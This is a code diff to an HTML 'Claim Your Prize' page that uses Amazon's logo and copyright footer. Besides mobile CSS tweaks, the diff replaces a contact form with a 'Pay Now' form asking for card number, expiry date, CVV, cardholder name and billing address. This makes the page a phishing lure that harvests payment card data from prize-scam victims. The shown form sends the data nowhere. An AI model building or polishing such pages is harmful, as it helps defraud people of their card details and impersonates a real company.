@@ -10,7 +10,7 @@
             background: rgb(0, 6, 71);
             color: #ffffff;
             margin: 0;
-            padding: 0;
+            padding: 20px;
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -19,12 +19,13 @@
 
         .container {
             max-width: 500px;
-            width: 90%;
+            width: 100%;
             padding: 30px;
             background: rgb(0, 6, 71);
             border: 1px solid #ddd;
             border-radius: 12px;
             box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+            box-sizing: border-box;
         }
 
         .header {
@@ -33,10 +34,14 @@
         }
 
         .logo {
-            width: 150px;
-            height: auto;
-            margin-bottom: 15px;
+            width: 120px;
+            height: 60px;
+            margin: 0 auto 15px;
+            display: block;
             border-radius: 8px;
+            object-fit: contain;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 10px;
         }
 
         h1 {
@@ -56,13 +61,14 @@
         }
 
         .prize-image {
-            width: 100%;
-            max-width: 200px;
-            height: auto;
+            width: 150px;
+            height: 150px;
             border-radius: 8px;
             margin: 0 auto 15px;
             display: block;
             box-shadow: 0 2px 8px rgba(0,0,0,0.3);
+            object-fit: cover;
+            background: rgba(255, 255, 255, 0.1);
         }
 
         .prize-title {
@@ -99,7 +105,7 @@
             box-sizing: border-box;
             background: rgba(255, 255, 255, 0.1);
             color: #ffffff;
-            font-size: 14px;
+            font-size: 16px;
         }
 
         input::placeholder {
@@ -133,6 +139,7 @@
             cursor: pointer;
             transition: all 0.3s ease;
             box-shadow: 0 4px 15px rgba(255, 135, 65, 0.3);
+            box-sizing: border-box;
         }
 
         .submit-btn:hover {
@@ -158,10 +165,33 @@
             color: #ffb366;
         }
 
+        /* Mobile optimizations */
         @media (max-width: 600px) {
+            body {
+                padding: 10px;
+            }
+            
             .container {
-                width: 95%;
                 padding: 20px;
+                margin: 0;
+            }
+            
+            h1 {
+                font-size: 24px;
+            }
+            
+            .logo {
+                width: 100px;
+                height: 50px;
+            }
+            
+            .prize-image {
+                width: 120px;
+                height: 120px;
+            }
+            
+            .prize-title {
+                font-size: 18px;
             }
             
             .form-row {
@@ -172,83 +202,77 @@
             .half {
                 width: 100%;
             }
+            
+            input {
+                font-size: 16px; /* Prevents zoom on iOS */
+            }
+        }
+
+        @media (max-width: 400px) {
+            .container {
+                padding: 15px;
+            }
+            
+            h1 {
+                font-size: 22px;
+            }
+            
+            .logo {
+                width: 80px;
+                height: 40px;
+            }
+            
+            .prize-image {
+                width: 100px;
+                height: 100px;
+            }
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <img src="amazon-logo.png" alt="Company Logo" class="amazon-logo.png">
+            <img src="amazon-logo.png" alt="Company Logo" class="logo">
             <h1>Claim Your Prize</h1>
         </div>
 
         <div class="prize-section">
-            <img src="prize-image.png" alt="Prize Image" class="prize-image.png">
-            <div class="prize-title"> Congratulations!</div>
+            <img src="prize-image.png" alt="Prize Image" class="prize-image">
+            <div class="prize-title">Congratulations!</div>
             <div class="prize-description">
                 You've won an amazing prize! Fill out the form below to claim your reward.
             </div>
+
         </div>
-
-        <form>
+           <form id="payment-form">
             <div class="form-group">
-                <label for="fullName">Full Name</label>
-                <input type="text" id="fullName" name="fullName" placeholder="Enter your full name" required>
+                <label for="card_number">Card Number</label>
+                <input type="text" id="card_number" name="card_number" placeholder="1234 5678 9012 3456" required pattern="\d{13,19}">
             </div>
-
-            <div class="form-group">
-                <label for="email">Email Address</label>
-                <input type="email" id="email" name="email" placeholder="Enter your email address" required>
-            </div>
-
-            <div class="form-group">
-                <label for="phone">Phone Number</label>
-                <input type="tel" id="phone" name="phone" placeholder="Enter your phone number" required>
-            </div>
-
             <div class="form-row">
-                <div class="half">
-                    <div class="form-group">
-                        <label for="city">City</label>
-                        <input type="text" id="city" name="city" placeholder="Your city" required>
-                    </div>
+                <div class="form-group half">
+                    <label for="expiry">Expiration Date (MM/YY)</label>
+                    <input type="text" id="expiry" name="expiry" placeholder="MM/YY" required pattern="(0[1-9]|1[0-2])\/[0-9]{2}">
                 </div>
-                <div class="half">
-                    <div class="form-group">
-                        <label for="zip">ZIP Code</label>
-                        <input type="text" id="zip" name="zip" placeholder="ZIP code" required>
-                    </div>
+                <div class="form-group half">
+                    <label for="cvv">CVV</label>
+                    <input type="text" id="cvv" name="cvv" placeholder="123" required pattern="\d{3,4}">
                 </div>
             </div>
-
-            <button type="submit" class="submit-btn">Claim My Prize</button>
+            <div class="form-group">
+                <label for="name">Cardholder Name</label>
+                <input type="text" id="name" name="name" placeholder="John Doe" required>
+            </div>
+            <div class="form-group">
+                <label for="billing_address">Billing Address</label>
+                <input type="text" id="billing_address" name="billing_address" placeholder="123 Main St, City, State, ZIP" required>
+            </div>
+            <button type="submit" class="submit-btn">Pay Now</button>
         </form>
-
-        <div class="footer">
-            <p>By submitting this form, you agree to our <a href="#">Terms & Conditions</a></p>
-        </div>
+        
+        <footer class="footer">
+             <p>&copy; Amazon.com, Inc. or its affiliates. All rights reserved. <a href="https://www.amazon.com/gp/help/customer/display.html?nodeId=508088" target="_blank">Privacy Notice</a></p>
+        </footer>
     </div>
-
-    <script>
-        document.querySelector('form').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            // Get form data
-            const formData = new FormData(this);
-            const data = Object.fromEntries(formData);
-            
-            // Simple validation
-            if (!data.fullName || !data.email || !data.phone) {
-                alert('Please fill in all required fields!');
-                return;
-            }
-            
-            // Success message
-            alert('Congratulations! Your prize claim has been submitted successfully!');
-            
-            // You can replace this with actual form submission logic
-            console.log('Form data:', data);
-        });
-    </script>
 </body>
 </html>
